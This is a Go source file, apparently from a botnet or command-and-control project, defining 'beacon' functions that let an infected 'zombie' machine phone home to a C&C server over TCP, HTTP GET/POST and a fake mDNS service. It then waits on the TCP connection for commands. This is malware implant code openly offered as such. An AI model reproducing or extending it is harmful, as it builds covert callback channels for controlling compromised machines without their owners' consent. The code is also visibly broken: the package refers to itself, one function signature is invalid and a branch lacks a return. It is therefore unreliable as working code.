/*/
This file contains the code for "beacons"

/*/
package shared_code

import (
	"bufio"
	"bytes"
	"encoding/json"
	"net"
	"net/http"
)

// Beacons
// TODO: "strange" ways of reaching out
// makes requests outside the network to get to the C&C

//used for reaching out with regular TCP connection, this will hand off to regular connection
// if a "good password *HINT*" is provided
// put the id of the entity connecting to let the host know it's us
func BaconTCP(zombie_ID string) {
	shared_code.PHONEHOME_TCP.IP = net.IP(shared_code.Remote_tcpaddr)
	connection, derp := net.DialTCP("tcp", &shared_code.Local_tcpaddr_LAN, &shared_code.PHONEHOME_TCP)
	if derp != nil {
		// print the error
		shared_code.Error_printer(derp, "[-] Error: TCP Beacon handshake Failed")
		return
	}
	// now we just wait...
	/// zombie should be dialing the home base expecting commands on connect
	// assuming we coded the command and control to reply on connect and not just
	// mark "we got one here" in some internal DB...
	// why dont you try coding some behaviors for the command and control binary
	// to enact on BEACON!
	// TODO: code C&C to pool callbacks into a list
	for {
		netData, derp := bufio.NewReader(connection).ReadString('\n')
		if derp != nil {
			// print the error
			shared_code.Error_printer(derp, "[-] Error: TCP Beacon Connection Failed")
			return
		}
	}
}

// Same for UDP
func BeaconUDP() {
}

// we are going to make different HTTP requests to the Command Server
// even though we are using POST, its not going to carry much data,
// and will only be used as a beacon. the handshake is a specific
// function that needs its own code and placement
func BeaconHTTP(command_url string, request_type string) (*http.Response, error) {
	// if its a get request
	switch request_type {
	case "get":
		http_response, derp := http.Get(command_url)
		if derp != nil {
			Error_printer(derp, "[-] Beacon GET failed to connect to command, stopping beacon")
			return http_response, derp
		}
		return http_response, derp
	case "post":
		post_body, derp := json.Marshal(BEACONPOSTPAYLOAD)
		if derp != nil {
			Error_printer(derp, "[-] Beacon POST payload failed to marshal, stopping beacon")
		}
		http_response, derp := http.Post(command_url, "text/html", bytes.NewBuffer(post_body))
		if derp != nil {
			Error_printer(derp, "[-] Beacon POST failed to connect to command, stopping beacon")
			return http_response, derp
		}
	}
}

func BeaconDNS(name) {
	MDNS_BEACON := shared_code.FakeMDNSService{}
	shared_code.StartMdnsReceiver(MDNS_BEACON)
}
